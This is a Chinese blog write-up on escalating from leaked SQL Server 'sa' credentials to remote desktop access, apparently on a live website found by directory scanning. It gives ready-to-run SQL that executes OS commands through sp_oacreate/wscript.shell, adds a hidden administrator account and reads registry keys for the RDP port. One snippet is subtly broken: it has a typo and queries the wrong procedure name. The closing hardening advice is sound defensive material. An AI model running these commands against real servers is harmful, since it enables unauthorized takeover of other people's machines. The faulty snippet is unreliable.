---
title: 从 SQL Server 提权到远程桌面（存在杀软）
date: 2022-12-25 15:01:00
updated: 2022-12-25 15:01:00
categories:
- [渗透,SQL Server]
tags:
- SQL Server
- 渗透
- 日记
keywords: SQL Server, sql server提权, 渗透
cover: https://img.dreamfall.cn/cover/14.webp
description: 电脑管家就不是什么好东西
---
{% note red 'fas fa-fan' flat%}
以下内容属于渗透复现，未经授权的渗透测试是不允许的
{% endnote %}
{% note red 'fas fa-fan' flat%}
利用本文中的技术造成的后果与本人无关，倡导维护网络安全人人有责，共同维护网络文明和谐。
{% endnote %}

## 介绍

SQL Server也称Mssql Server，是微软家的数据库，常见于操作系统是Windows Server的服务器上

SQL Server的默认超级管理员是`sa`，在早期版本中，SQL Server的权限非常大，是`SYSTEM`权限

`sa`用户不仅能修改所有数据库的内容，还能直接对windows的注册表进行修改，执行命令等

## 渗透过程
### 获取数据库密码
通过SQL Server提权渗透，需要数据库的账号密码，不巧的是，我在扫描网站的目录时。发现了一处信息泄露，泄露的SQL Server的用户和密码，更巧的是这个网站使用的是`sa`用户，还告诉了我SQL Server的IP端口，于是我尝试连接，成功连上数据库。
![test.asp](https://img.dreamfall.cn/post/sqlserver/1.webp)
### 执行命令
成功连上数据库，基本上就一半成功了，接下来尝试执行命令
![连接数据库](https://img.dreamfall.cn/post/sqlserver/2.webp)
#### 尝试xp_cmdshell
1. 确认`xp_cmdshell`是否存在
   ```sql
   elect count(*) from master.dbo.sysobjects where xtype='x' and name='sp_oacreate';
   ```
   ![xp_cmdshell](https://img.dreamfall.cn/post/sqlserver/3.webp)
结果为1，则证明存在

2. 使用`xp_cmdshell`执行命令，发现报错
    ![xp_cmdshell_2](https://img.dreamfall.cn/post/sqlserver/4.webp)
   `xp_cmdshell`存在，却无法执行命令，我当时怀疑是`xplog70.dll`被删了，`xp_cmdshell`是通过`xplog70.dll`来执行命令的

3. 尝试重新启用`xp_cmdshell`，结果命令结果告诉我`xp_cmdshell`不存在，在高级配置选项里也没有。
   ![xp_cmdshell_3](https://img.dreamfall.cn/post/sqlserver/5.webp)

4. 于是我又尝试重新加载`xp_cmdshell`，
   ```sql
   dbcc addextendedproc("xp_cmdshell","xplog70.dll");
   ```
   ![xp_cmdshell_4](https://img.dreamfall.cn/post/sqlserver/6.webp)

   结果告诉我数据库中已存在名为 'xp_cmdshell' 的对象。

   既然已经存在，那我就删了再重建
   ![xp_cmdshell_5](https://img.dreamfall.cn/post/sqlserver/7.webp)
   结果删都不让我删

我当时这个人直接傻掉，第一次遇到这种情况，存在又不存在的'xp_cmdshell'

#### sp_oacreate

于是`xp_cmdshell`没法用，我尝试使用`sp_oacreate`提权

1. 尝试用系统`wscript.shell`来执行系统命令

   ```sql
   declare @shell int
   exec sp_oacreate 'wscript.shell',@shell output
   exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net users > F:\tmp\1.txt'
   ```

   执行`net user`命令，并将命令的结果写入网站目录下`1.txt`文件中，通过浏览器访问该文件，获取命令回显
   ![sp_oacreate](https://img.dreamfall.cn/post/sqlserver/10.webp)
   访问文件，发现命令执行成功
   ![sp_oacreate_2](https://img.dreamfall.cn/post/sqlserver/9.webp)

2. 创建用户，添加用户到`administrators`组
   ```sql
   declare @shell int
   exec sp_oacreate 'wscript.shell',@shell output
   exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user abcd 123456 /add'
   exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators abcd /add'
   ```
3. 查看远程桌面服务是否启动
   ```sql
   EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server' ,'fDenyTSConnections'
   ```
   0表示开启
4. 获取远程桌面端口
   ```sql
   EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
   ```
    ![远程桌面](https://img.dreamfall.cn/post/sqlserver/11.webp)

5. 用windows自带的远程桌面连接成功连上服务器
   ![远程桌面2](https://img.dreamfall.cn/post/sqlserver/12.webp)
发现了这电脑上存在杀软，居然是电脑管家。。。

翻看日志，发现我用 'xp_cmdshell' 执行的命令被这电脑管家拦截了。。。
![电脑管家](https://img.dreamfall.cn/post/sqlserver/8.webp)

## 总结
1. 数据库的管理员账号不要使用于生产环境，一旦成功登录，基本上就离控住你电脑不远了
2. 记得清理网站目录下的文件，防止被利用
3. 腾讯电脑管家用处不大，但总比裸奔好